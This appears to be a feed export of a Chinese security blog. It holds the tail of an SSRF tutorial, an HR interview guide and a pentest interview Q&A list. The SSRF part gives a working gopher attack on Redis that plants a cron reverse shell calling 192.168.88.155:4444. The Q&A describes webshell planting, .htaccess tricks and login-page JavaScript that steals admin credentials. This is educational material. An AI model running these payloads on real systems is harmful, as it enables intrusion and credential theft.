id="gopher攻击redis"><a href="#gopher攻击redis" class="headerlink" title="gopher攻击redis"></a>gopher攻击redis</h3><p>如果内网中的redis存在未授权访问漏洞，当Redis服务以root 权限运行时，利用 Gopher 协议攻击内网中的 Redis，通过写入定时任务可以实现反弹shell。</p><ol><li><p>使用socat进行端口转发，将本地的4444端口转发到目标的6379端口，此时访问本地的4444端口，其实是访问目标的6379端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.88.158:6379</span><br></pre></td></tr></table></figure></li><li><p>执行以下bash脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash redis_cron.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.155&#x2F;4444 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir &#x2F;var&#x2F;spool&#x2F;cron&#x2F;</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure></li><li><p>捕获到攻击redis的数据包，保存成socat.log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2019&#x2F;02&#x2F;01 02:04:10.385362  length&#x3D;90 from&#x3D;0 to&#x3D;89</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$63\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.155&#x2F;4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;02&#x2F;01 02:04:10.387206  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;02&#x2F;01 02:04:10.390057  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;02&#x2F;01 02:04:10.392226  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;02&#x2F;01 02:04:10.394801  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;02&#x2F;01 02:04:10.396341  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;02&#x2F;01 02:04:10.399187  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;02&#x2F;01 02:04:10.409391  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;02&#x2F;01 02:04:10.419846  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;02&#x2F;01 02:04:10.420636  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure></li><li><p>使用以下脚本将数据包进行转码，得到poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">#author: JoyChou</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">exp &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">with open(sys.argv[1]) as f:</span><br><span class="line">    for line in f.readlines():</span><br><span class="line">        if line[0] in &#39;&gt;&lt;+&#39;:</span><br><span class="line">            continue</span><br><span class="line">        # 判断倒数第2、3字符串是否为\r</span><br><span class="line">        elif line[-3:-1] &#x3D;&#x3D; r&#39;\r&#39;:</span><br><span class="line">            # 如果该行只有\r，将\r替换成%0a%0d%0a</span><br><span class="line">            if len(line) &#x3D;&#x3D; 3:</span><br><span class="line">                exp &#x3D; exp + &#39;%0a%0d%0a&#39;</span><br><span class="line">            else:</span><br><span class="line">                line &#x3D; line.replace(r&#39;\r&#39;, &#39;%0d%0a&#39;)</span><br><span class="line">                # 去掉最后的换行符</span><br><span class="line">                line &#x3D; line.replace(&#39;\n&#39;, &#39;&#39;)</span><br><span class="line">                exp &#x3D; exp + line</span><br><span class="line">        # 判断是否是空行，空行替换为%0a</span><br><span class="line">        elif line &#x3D;&#x3D; &#39;\x0a&#39;:</span><br><span class="line">            exp &#x3D; exp + &#39;%0a&#39;</span><br><span class="line">        else:</span><br><span class="line">            line &#x3D; line.replace(&#39;\n&#39;, &#39;&#39;)</span><br><span class="line">            exp &#x3D; exp + line</span><br><span class="line">print exp</span><br></pre></td></tr></table></figure></li><li><p>使用curl命令进行测试，成功接收到反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &#39;gopher:&#x2F;&#x2F;192.168.88.158:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.88.155&#x2F;4444 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-SSRF简介&quot;&gt;&lt;a href=&quot;#1-SSRF简介&quot; class=&quot;headerlink&quot; title=&quot;1 SSRF简介&quot;&gt;&lt;/a&gt;1 SSRF简介&lt;/h1&gt;&lt;p&gt;SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏
      
    
    </summary>
    
    
      <category term="漏洞详解" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/"/>
    
    
      <category term="web漏洞" scheme="http://yoursite.com/tags/web%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>人事面经</title>
    <link href="http://yoursite.com/2020/02/26/%E4%BA%BA%E4%BA%8B%E9%9D%A2%E7%BB%8F/"/>
    <id>http://yoursite.com/2020/02/26/%E4%BA%BA%E4%BA%8B%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-02-26T04:17:19.000Z</published>
    <updated>2020-02-26T04:17:46.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><p>注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度的把控最好自己能让同学、朋友担任面试官，让他们多多挑你的刺，从而不断练习自己的反应能力。技术面试通过的，在HR这边通不过的例子是有很多的！</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="对我们公司有什么了解，为什么选择本公司"><a href="#对我们公司有什么了解，为什么选择本公司" class="headerlink" title="对我们公司有什么了解，为什么选择本公司"></a>对我们公司有什么了解，为什么选择本公司</h3><p>在信息安全行业比较知名，了解过公司的xx产品。（每次面试某个公司，都要花5-10分钟了解该公司的产品）</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="为什么想要应聘这个职位"><a href="#为什么想要应聘这个职位" class="headerlink" title="为什么想要应聘这个职位"></a>为什么想要应聘这个职位</h3><p>从我的经历上可以很清楚地看到我对网络安全的浓厚兴趣，我认为对本职工作有兴趣的人才能更好地完成这个工作。另外也有一句话说得很棒，“你之所以看不见黑暗，是因为有人拼命把它挡在你看不到的地方”，我认为做信息安全的尤其是渗透测试，就是为了更好地保护用户的安全，防患于未然，也是我想要应聘这个岗位的理由。（不要照背，体现自己的热爱和专业能力）</p><h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3><h3 id="对安全服务是怎么理解的"><a href="#对安全服务是怎么理解的" class="headerlink" title="对安全服务是怎么理解的"></a>对安全服务是怎么理解的</h3><p>安全服务对象是人， 渗透测试对象是网站。（我的理解）</p><ul><li>安全概念和资讯</li><li>安全工具使用</li><li>渗透测试</li><li>安全基线检查</li><li>应急响应</li><li>代码审计</li><li>安全边界建设</li><li>安全规范</li></ul><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><h3 id="如果我不知道渗透测试，两分钟说一下"><a href="#如果我不知道渗透测试，两分钟说一下" class="headerlink" title="如果我不知道渗透测试，两分钟说一下"></a>如果我不知道渗透测试，两分钟说一下</h3><p>（此处自行组织语言，力求能将渗透测试讲得浅显易懂，时间控制在三分钟以内）</p><h3 id="-5"><a href="#-5" class="headerlink" title=""></a></h3><h3 id="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"><a href="#如果我是一个汽车厂商，你如何证明你的工作是有意义的？" class="headerlink" title="如果我是一个汽车厂商，你如何证明你的工作是有意义的？"></a>如果我是一个汽车厂商，你如何证明你的工作是有意义的？</h3><p>（对于不懂得安全的人来说，怎么能说服他需要进行渗透测试，渗透测试有什么作用）</p><h3 id="-6"><a href="#-6" class="headerlink" title=""></a></h3><h3 id="作为应届生，你如何能胜任该职位"><a href="#作为应届生，你如何能胜任该职位" class="headerlink" title="作为应届生，你如何能胜任该职位"></a>作为应届生，你如何能胜任该职位</h3><p>正如前方所说，我学习能力很强，主观能动性强，能很快地做好下派的任务，所以我认为我能很好地胜任这个职位</p><h3 id="-7"><a href="#-7" class="headerlink" title=""></a></h3><h3 id="你有什么职业规划"><a href="#你有什么职业规划" class="headerlink" title="你有什么职业规划"></a>你有什么职业规划</h3><p>渗透测试工程师-&gt;渗透测试项目负责人-&gt;安全架构师（安全咨询顾问）</p><h3 id="-8"><a href="#-8" class="headerlink" title=""></a></h3><h3 id="如果离职的话是因为什么原因"><a href="#如果离职的话是因为什么原因" class="headerlink" title="如果离职的话是因为什么原因"></a>如果离职的话是因为什么原因</h3><p>个人规划和公司有冲突，缺少上升空间。（就算是因为钱少、和同事 <del>打架</del> 不和，也不要明说……）</p><h3 id="-9"><a href="#-9" class="headerlink" title=""></a></h3><h3 id="你有什么优缺点"><a href="#你有什么优缺点" class="headerlink" title="你有什么优缺点"></a>你有什么优缺点</h3><ul><li>优点：对网络安全十分热爱，抗压能力强，学习能力强，责任感强</li><li>缺点：遇到技术难点时可能会一直钻研，可能会耽搁到其它事情 （情商高一点，不要真的说自己的缺点）</li></ul><h3 id="-10"><a href="#-10" class="headerlink" title=""></a></h3><h3 id="对于薪资的要求"><a href="#对于薪资的要求" class="headerlink" title="对于薪资的要求"></a>对于薪资的要求</h3><p>月薪13-15K，可以接受1k的浮动</p><h3 id="-11"><a href="#-11" class="headerlink" title=""></a></h3><h3 id="给不了这么多工资可以接受吗？为什么想要这个数？"><a href="#给不了这么多工资可以接受吗？为什么想要这个数？" class="headerlink" title="给不了这么多工资可以接受吗？为什么想要这个数？"></a>给不了这么多工资可以接受吗？为什么想要这个数？</h3><ol><li>贵公司和我其实比较契合，我可以接受月薪1k左右的浮动。（表明自己的接受范围和立场）</li><li>可能我某些方面表现得不够好或者表达不清晰，让您觉得我的能力不够。您可以根据这些点再问我几个问题。（表明自己对自身的判断，认为自己值得这个数，委婉提示面试官可能判断有误）</li><li>通过贵司的招聘信息和整个市场平均水平看，我认为我岗位匹配度比较好，值得这个工资水平。（明确回答，要有自信） （这个问题千万不要顶嘴或拍桌走人，可参考我的知乎回答 面试想拿 10K，HR 说你只值 7K，该怎样回答或者反驳？ - 李与归的回答 - 知乎 <a href="https://www.zhihu.com/question/282880854/answer/432987673" target="_blank" rel="noopener">https://www.zhihu.com/question/282880854/answer/432987673</a> ）</li></ol><h3 id="-12"><a href="#-12" class="headerlink" title=""></a></h3><h3 id="进入部门后，你需要多长时间进入项目？"><a href="#进入部门后，你需要多长时间进入项目？" class="headerlink" title="进入部门后，你需要多长时间进入项目？"></a>进入部门后，你需要多长时间进入项目？</h3><p>（表达自己的快速学习能力）</p><h3 id="-13"><a href="#-13" class="headerlink" title=""></a></h3><h3 id="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"><a href="#上一个面试的人能力跟你差不多，但是工资方面比你要的低？" class="headerlink" title="上一个面试的人能力跟你差不多，但是工资方面比你要的低？"></a>上一个面试的人能力跟你差不多，但是工资方面比你要的低？</h3><p>（表达综合素质方面，比如沟通能力好、领导能力好、文档能力好等等）</p><h3 id="-14"><a href="#-14" class="headerlink" title=""></a></h3><h3 id="是否可以接受加班"><a href="#是否可以接受加班" class="headerlink" title="是否可以接受加班"></a>是否可以接受加班</h3><p>加班肯定是不可避免的，我可以接受项目需求的加班，毕竟完成工作是员工所要尽到的责任。同时我也会提高自己的工作效率，配合完成工作。（同样的，情商高一点，口头说要加班，入职之后要不要加班不就是……:&gt;）</p><h3 id="-15"><a href="#-15" class="headerlink" title=""></a></h3><h3 id="（沟通能力）和领导、同事产生分歧会怎么办"><a href="#（沟通能力）和领导、同事产生分歧会怎么办" class="headerlink" title="（沟通能力）和领导、同事产生分歧会怎么办"></a>（沟通能力）和领导、同事产生分歧会怎么办</h3><p>出现分歧是十分正常的事情，产生分歧很有可能是双方理解不一样，如何有效沟通、相互理解才是重中之重。在我看来还是会以大局出发，以有益于公司和客户的方向出发。</p><h3 id="-16"><a href="#-16" class="headerlink" title=""></a></h3><h3 id="工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法"><a href="#工作一段时间后，发现工作不是想象中的，会怎么办-对跳槽的看法" class="headerlink" title="工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法"></a>工作一段时间后，发现工作不是想象中的，会怎么办/对跳槽的看法</h3><p>我在找工作之前，都会了解好这份工作的具体职责，如果我工作一段时间后发现工作不是想象中的，那只能说明我的职业目标不够清晰。（圆滑点）</p><h3 id="-17"><a href="#-17" class="headerlink" title=""></a></h3><h3 id="对上司有什么要求？喜欢和什么样的领导合作？"><a href="#对上司有什么要求？喜欢和什么样的领导合作？" class="headerlink" title="对上司有什么要求？喜欢和什么样的领导合作？"></a>对上司有什么要求？喜欢和什么样的领导合作？</h3><p>我来求职都是为了能找到一个希望能提升自己的平台，我希望更能找到一个技术经验丰富的领导。</p><h3 id="-18"><a href="#-18" class="headerlink" title=""></a></h3><h3 id="最有影响的一件事-人"><a href="#最有影响的一件事-人" class="headerlink" title="最有影响的一件事/人"></a>最有影响的一件事/人</h3><p>（最好是在安全领域方面的，说上一些黑客事件，表明自己热爱安全领域）</p><h3 id="-19"><a href="#-19" class="headerlink" title=""></a></h3><h3 id="你还要问什么问题"><a href="#你还要问什么问题" class="headerlink" title="你还要问什么问题"></a>你还要问什么问题</h3><ul><li>有没有岗位晋升机制，入职培训项目，员工培训提升项目？考证有没有报销？</li><li>五险一金、社保比例、饭补、餐补、交通补助？</li><li>应聘岗位具体职责和工作内容？会不会经常出差？</li><li>试用期多久？薪水多少？</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HR面&quot;&gt;&lt;a href=&quot;#HR面&quot; class=&quot;headerlink&quot; title=&quot;HR面&quot;&gt;&lt;/a&gt;HR面&lt;/h1&gt;&lt;p&gt;注意！HR面试的时候会有非常多的坑，熟悉我在这里写的问题，回答的时候情商高一点，不要跟HR吵起来，也不要有不合时宜的意见分歧，这个度
      
    
    </summary>
    
    
      <category term="面经总结" scheme="http://yoursite.com/categories/%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="面经" scheme="http://yoursite.com/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>面试面经</title>
    <link href="http://yoursite.com/2020/02/26/%E6%8A%80%E6%9C%AF%E9%9D%A2%E7%BB%8F/"/>
    <id>http://yoursite.com/2020/02/26/%E6%8A%80%E6%9C%AF%E9%9D%A2%E7%BB%8F/</id>
    <published>2020-02-26T03:07:03.000Z</published>
    <updated>2020-02-27T07:54:54.511Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>sql注入时碰到update型和insert型，你会利用哪种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert型，避免对原数据作出修改。</span><br></pre></td></tr></table></figure></li><li><p>进入后台后看到密码全为*号，此时应该怎么做</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">右键，查看网页源码</span><br><span class="line">修改type属性</span><br></pre></td></tr></table></figure></li><li><p>介绍你挖掘的一个思路新奇的漏洞</p></li><li><p>了解内网吗？ </p></li><li><p>在论坛（看雪、t00ls等）发表过哪些文章</p></li><li><p>开发能力怎么样？开发过哪些项目，有参与开源的经历吗</p></li><li><p>如何反弹shell</p></li><li><p>你维护着一个博客，如何防止被黑客攻击</p></li><li><p>没有回显，如何确定可以执行命令</p></li><li><p>介绍下apache解析漏洞</p></li><li><p>用几句话介绍下sql注入的本质</p></li><li><p>如何防御sql注入</p></li><li><p>写过多线程吗？</p></li><li><p>熟悉tcp/ip吗？</p></li><li><p>有网络编程的经验吗</p></li><li><p>熟悉缓存吗？比如redis</p></li><li><p>了解python线程、进程、携程的区别吗</p></li><li><p>用过python哪些库</p></li><li><p>用python做过哪些项目，介绍一下</p></li><li><p>你之前的渗透测试报告？</p></li><li><p>中了勒索病毒怎么应急？</p></li><li><p>php有哪些危险函数？</p></li><li><p>三级等保口令复杂度？</p></li><li><p>对正则了解吗？</p></li><li><p>python爬虫怎么运用？</p></li><li><p>说明一次完整的渗透经历？</p></li><li><p>简单的介绍下你的工作内容</p></li><li><p>你熟悉那种数据库（mysql/mssql）</p></li><li><p>你熟悉手工注入吗？</p></li><li><p>简单说下你遇到的CSRF</p></li><li><p>简述下XSS</p></li><li><p>SQL注入的形成</p></li><li><p>说说你对盲注的理解</p></li><li><p>什么叫本地包含漏洞</p></li><li><p>当mysql是普通用户时怎么提权</p></li><li><p>当MYSQL为ROOT时怎么提权</p></li><li><p>apache/nginx配置文件的位置</p></li><li><p>什么叫二次注入</p></li><li><p>如何让不不同目录用户不能相互访问</p></li><li><p>python的L模型（这里我真不知道这是啥。。）</p></li><li><p>python如何发起一个http请求（感觉面试官好无聊）</p></li><li><p>当httponly 如何获取COOKIE</p></li><li><p>mysql提权有那几种？</p></li><li><p>mssql提权有那几种？</p></li><li><p>你会什么语言？restapi用得熟悉吗？</p></li><li><p>你写过大型项目吗？</p></li><li><p>当php写得WEB没有任何漏洞你如何渗透？</p></li><li><p>如何信息收集，应该收集那些信息？</p></li><li><p>你了解哪些漏洞？</p></li><li><p>你挖到的逻辑漏洞有哪些？</p></li><li><p>你参加过ctf？</p></li><li><p>你写过漏洞报告吗？(src)</p></li><li><p>部署过dwva吗？</p></li><li><p>用过哪些工具？</p></li><li><p>你拿到过webshell吗？</p></li><li><p>你在哪些src发过漏洞，截图？</p></li><li><p>你写过哪些脚本？原理？</p></li><li><p>linux提权？</p></li><li><p>windows提权？</p></li><li><p>mysql提权？</p></li><li><p>linux配置登录次数文件在哪个目录下面？</p></li><li><p>谈谈你绕waf的经历和经验？</p></li><li><p>请回答如下端口默认对应的服务，以及在渗透测试过程中我们可以从哪些角度考虑其安全问题。端口：21、22、873、1433、3306、6379、11211</p></li><li><p>你所知道的网络抓包工具有哪些？对android或者ios设备怎么进行抓包。</p></li><li><p>请说明黑客常用的清除痕迹的方式及对应的监控方法（linux和windows系统）</p></li><li><p>罗列最近几年影响较大的安全漏洞并请大概介绍其原理、危害（请列举3个）</p></li><li><p>拿到一个待检测的站，你觉得应该先做什么？<br>收集信息<br>whois、网站源IP、旁站、C段网站、服务器系统版本、容器版本、程序版本、数据库类型、二级域名、防火墙、维护者信息另说…</p></li><li><p>mysql的网站注入，5.0以上和5.0以下有什么区别？</p></li></ul><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操做。</p><ul><li><p>3.在渗透过程中，收集目标站注册人邮箱对我们有什么价值？<br>丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。<br>用邮箱做关键词进行丢进搜索引擎。<br>利用搜索到的关联信息找出其他邮进而得到常用社交账号。<br>社工找出社交账号，里面或许会找出管理员设置密码的习惯 。<br>利用已有信息生成专用字典。<br>观察管理员常逛哪些非大众性网站，拿下它，你会得到更多好东西。</p></li><li><p>4.判断出网站的CMS对渗透有什么意义？<br>查找网上已曝光的程序漏洞。<br>如果开源，还能下载相对应的源码进行代码审计。</p></li><li><p>5.一个成熟并且相对安全的CMS，渗透时扫目录的意义？<br>敏感文件、二级目录扫描<br>站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p></li><li><p>6.常见的网站服务器容器。<br>IIS、Apache、nginx、Lighttpd、Tomcat</p></li><li><p>7.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？<br>root权限以及网站的绝对路径。</p></li><li><p>8.目前已知哪些版本的容器有解析漏洞，具体举例。<br>IIS 6.0<br>/xx.asp/xx.jpg “xx.asp”是文件夹名<br>IIS 7.0/7.5<br>默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析<br>Nginx<br>版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>空字节代码 xxx.jpg%00.php<br>Apache<br>上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀<br>lighttpd<br>xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！</p></li><li><p>9.如何手工快速判断目标站是windows还是linux服务器？<br>linux大小写敏感,windows大小写不敏感。</p></li><li><p>10.为何一个mysql数据库的站，只有一个80端口开放？<br>更改了端口，没有扫描出来。<br>站库分离。<br>3306端口不对外开放</p></li><li><p>11.3389无法连接的几种情况。<br>没开放3389 端口<br>端口被修改<br>防护拦截<br>处于内网(需进行端口转发)</p></li><li><p>12.如何突破注入时字符被转义？<br>宽字符注入<br>hex编码绕过</p></li><li><p>13.在某后台新闻编辑界面看到编辑器，应该先做什么？<br>查看编辑器的名称版本,然后搜索公开的漏洞。</p></li><li><p>14.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？<br>能做的事情很多，用隐藏网马来举例子：<br>插入<br>&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </FilesMatch><br>.jpg文件会被解析成.php文件。<br>具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p></li><li><p>15.注入漏洞只能查账号密码？<br>只要权限广，拖库脱到老。</p></li><li><p>16.安全狗会追踪变量，从而发现出是一句话木马吗？<br>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p></li><li><p>17.access 扫出后缀为asp的数据库文件，访问乱码。如何实现到本地利用。<br>迅雷下载，直接改后缀为.mdb。</p></li><li><p>18.提权时选择可读写目录，为何尽量不用带空格的目录？<br>因为exp执行多半需要空格界定参数</p></li><li><p>19.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？<br>同数据库。</p></li><li><p>20.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？<br>and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p></li><li><p>21:某个防注入系统，在注入时会提示：<br>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1<br>如何利用这个防注入系统拿shell？<br>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。具体文章参见：<a href="http://ytxiao.lofter.com/post/40583a_ab36540。" target="_blank" rel="noopener">http://ytxiao.lofter.com/post/40583a_ab36540。</a></p></li><li><p>22.上传大马后访问乱码时，有哪些解决办法？<br>浏览器中改编码。</p></li><li><p>23.审查上传点的元素有什么意义？<br>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p></li><li><p>24.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？<br>先爆破用户名，再利用被爆破出来的用户名爆破密码。<br>其实有些站点，在登陆处也会这样提示<br>所有和数据库有交互的地方都有可能有注入。</p></li><li><p>25.目标站发现某txt的下载地址为<a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a><br>这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p></li><li><p>26.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？<br>直接在网站二级目录/abc/下扫描敏感文件及目录。</p></li><li><p>27.在有shell的情况下，如何使用xss实现对目标站的长久控制？<br>后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。<br>在登录后才可以访问的文件中插入XSS脚本。</p></li><li><p>28.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？<br>审查元素 把密码处的password属性改成text就明文显示了</p></li><li><p>29.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？<br>原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p></li><li><p>30.审查元素得知网站所使用的防护软件，你觉得怎样做到的？<br>在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</p></li><li><p>31.在win2003服务器中建立一个 .zhongzi文件夹用意何为？<br>隐藏文件夹，为了不让管理员发现你传上去的工具。</p></li><li><p>32、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：<br>A. demo.jsp?id=2+1       B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p></li><li><p>33、以下链接存在 sql 